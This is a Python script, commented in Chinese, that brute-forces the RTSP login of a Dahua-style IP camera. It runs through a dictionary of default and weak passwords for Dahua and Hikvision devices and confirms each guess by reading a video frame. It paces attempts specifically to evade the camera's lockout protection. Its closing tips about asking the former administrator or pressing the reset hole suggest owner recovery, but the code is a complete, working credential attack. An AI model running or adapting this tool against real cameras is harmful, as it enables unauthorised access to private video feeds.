import cv2
import time
import socket

# 目标配置
IP = "192.168.1.108"
PORT = 554
USERNAME = "admin"  # 大华默认账号通常锁死为 admin

# 大华标准 RTSP 路径
PATH = "/cam/realmonitor?channel=1&subtype=0"

 # === 增强版密码字典 (侧重大华/海康及弱口令变体) ===
PASSWORDS = [
    # --- 第一梯队 ---
    "admin", "123456", "admin123", "888888", "666666",
    "root", "password", "12345", "default", "", 
    
    # --- 第二梯队 ---
    "1234567", "12345678", "123456789", "1234567890",
    "admin12345", "admin123456", "admin888",
    "88888888", "66666666", "11111111", "00000000",
    
    # --- 第三梯队---
    "dahua", "dahua123", "dahuatech", "dvr", "dvr123", "nvr", "nvr123",
    "hikvision", "hik12345", "hik123456",
    "cctv", "cctv123", "camera", "camera123",
    "system", "service", "operator", "guest", "support",
    "adminadmin", "user", "user123",
    
    # --- 第四梯队 ---
    "1111", "111111", "0000", "000000",
    "123123", "123456abc", "abc123456",
    "qwer", "qwert", "qwerty", "qazwsx",
    "nimda", "toor", # 反序
    "54321", "654321",
    
    # --- 第五梯队 ---
    "admin2018", "admin2019", "admin2020", "admin2021", 
    "admin2022", "admin2023", "admin2024", "admin2025",
    "Dahua2020", "Dahua2021", "Dahua2022", "Dahua2023",
    
    # --- 第六梯队 ---
    "lc123456", "SC-Dahua", "viz123", "888888", "000000",
    "admin01", "admin001", "admin1", "admin2",   
     
    
]

def check_port_open(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    try:
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def try_connect(url):
    cap = cv2.VideoCapture(url)
    if cap.isOpened():
        # 尝试读取一帧以防假连接
        ret, frame = cap.read()
        cap.release()
        if ret:
            return True
    return False

def main():
    print(f"--- 开始对 {IP} 进行深度爆破 ---")
    
    if not check_port_open(IP, PORT):
        print(f"❌ 端口 {PORT} 无法连接，请检查网线或 IP 设置！")
        return

    print(f"目标路径: {PATH}")
    print(f"待测密码数: {len(PASSWORDS)}")
    print("-" * 40)

    for i, pwd in enumerate(PASSWORDS):
        # 构造 URL (处理空密码情况)
        if pwd:
            url = f"rtsp://{USERNAME}:{pwd}@{IP}:{PORT}{PATH}"
            display_pwd = pwd
        else:
            url = f"rtsp://{USERNAME}@{IP}:{PORT}{PATH}" # 尝试无密码
            display_pwd = "<空>"

        print(f"[{i+1}/{len(PASSWORDS)}] 尝试: {display_pwd:<15} ... ", end="", flush=True)
        
        if try_connect(url):
            print("✅ 成功！！！")
            print("=" * 40)
            print(f"🎉 破解成功！")
            print(f"账号: {USERNAME}")
            print(f"密码: {display_pwd}")
            print(f"完整 URL: {url}")
            print("=" * 40)
            return
        
        print("失败")
        # 稍微延时，防止触发设备的安全锁定机制
        time.sleep(2)

    print("-" * 40)
    print("❌ 所有密码均尝试失败。")
    print("建议：")
    print("1. 询问前任管理员。")
    print("2. 再次仔细寻找设备上的物理 Reset 孔（有时是一个很难发现的小洞，需要回形针戳）。")
    print("3. 拆开外壳，有些 Reset 触点在电路板内部。")

if __name__ == "__main__":
    main()